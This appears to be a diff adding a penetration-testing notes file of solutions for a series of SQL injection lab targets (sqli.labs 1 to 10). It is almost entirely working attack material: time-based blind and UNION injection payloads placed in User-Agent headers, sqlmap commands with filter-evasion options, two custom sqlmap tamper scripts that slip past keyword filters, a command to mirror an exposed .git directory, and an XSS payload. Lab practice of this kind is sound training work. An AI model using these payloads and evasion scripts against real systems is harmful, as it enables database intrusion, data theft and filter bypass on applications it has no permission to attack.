@@ -1,0 +1,131 @@
+'OR+(SELECT+1+FROM+(SELECT(SLEEP(MID(version(),1,1))))test)+OR+'.test'=.test
+
+domain='%20AND%20(SELECT%208962%20FROM%20(SELECT(SLEEP(10)))XsPo)%20AND%20'unHa'='unHa.site
+
+sqlmap -u 'http://9.sqli.labs/' -p user-agent --tamper=chardoubleencode --technique=U --banner --level=3 --risk=3
+
+sqlmap -r 9.sqli.labs.for.sqlmap --banner --tamper=chardoubleencode --dbms mysql --batch --union-char=els  --technique=E
+
+sqlmap -u 'http://1.sqli.labs/' -p user-agent --random-agent --banner
+sqlmap -u 'http://2.sqli.labs/' -p user-agent --user-agent=elsagent --technique=B --banner
+sqlmap -u 'http://3.sqli.labs/' -p user-agent --random-agent --technique=U --tamper=space2comment --suffix=';#' --union-char=els --banner
+
+Host: 4.sqli.labs
+User-Agent: 'union(SELECT(group_concat(column_name))FROM(information_schema.columns)where(table_name='secretcustomers'));#
+
+Host: 5.sqli.labs
+User-Agent: "union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#
+
+
+Host: 6.sqli.labs
+User-Agent: ' UNiOn seLect @@versiOn;#
+
+#!/usr/bin/env python
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    """
+    Replaces each keyword a CaMeLcAsE VeRsIoN of it.
+
+    >>> tamper('INSERT')
+    'InSeRt'
+    """
+
+    retVal = str()
+
+    if payload:
+        for i in xrange(len(payload)):
+            if (i % 2 == 0):
+                # We cannot break 0x12345
+                if not ((payload[i] == 'x') and (payload[i-1] == '0')):
+                    retVal += payload[i].upper()
+                else:
+                    retVal += payload[i]
+            else:
+                retVal += payload[i].lower()
+    return retVal
+
+SQLMap command line:
+
+sqlmap -u 'http://6.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/camelcase.py --prefix="nonexistent'" --suffix=';#' --union-char=els --banner
+
+
+Host: 7.sqli.labs
+User-Agent: ' uZEROFILLnZEROFILLiZEROFILLoZEROFILLnZEROFILL ZEROFILLsZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt ZEROFILL@@ZEROFILLvZEROFILLeZEROFILLrZEROFILLsZEROFILLiZEROFILLoZEROFILLnZEROFILL; ZEROFILL-- ZEROFILL-ZEROFILL
+
+Tampering script:
+
+#!/usr/bin/env python
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    """
+    Insert FILL after every character
+
+    >>> tamper('INSERT')
+    'IfillNfillSfillEfillRfillTfill
+    """
+
+    retVal = str()
+
+    FILL='ZEROFILL'
+
+    if payload:
+        for i in xrange(len(payload)):
+            retVal += payload[i]+FILL
+    # Uncomment to debug
+#    print "pretamper:", payload
+    return retVal
+
+SQLMap automation:
+
+sqlmap -u 'http://7.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/fill.py --banner
+
+
+Host: 8.sqli.labs
+User-Agent: %61%61%61%61%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%3b%20%2d%2d%20%2d
+
+SQLMap Automation:
+
+sqlmap -u 'http://8.sqli.labs/' -p user-agent --tamper=charencode --technique=U --banner
+
+SQLi 9
+Double encoding.
+PoC:
+
+GET / HTTP/1.1
+Host: 9.sqli.labs
+User-Agent: %25%36%31%25%36%31%25%36%31%25%36%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%34%30%25%34%30%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%33%62%25%32%30%25%32%64%25%32%64%25%32%30%25%32%64
+
+SQLMap Automation:
+
+sqlmap -u 'http://9.sqli.labs/' -p user-agent --tamper=chardoubleencode --technique=U --banner
+
+SQLi 10
+This labs combines reserver keyword filtering with an injection in a function.
+PoC:
+
+GET / HTTP/1.1
+Host: 10.sqli.labs
+User-Agent: ') uZEROFILLnZEROFILLiZEROFILLoZEROFILLn sZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt 'PoC'; -- -
+
+SQLMap Automation:
+
+sqlmap -u 'http://10.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/fill.py --prefix="notexistant')" --suffix="; -- " --union-char=els --banner
+
+
+
+wget --mirror -I .git http://10.100.13.34/.git/
+
+
+xss: <script>alert`1`</script>
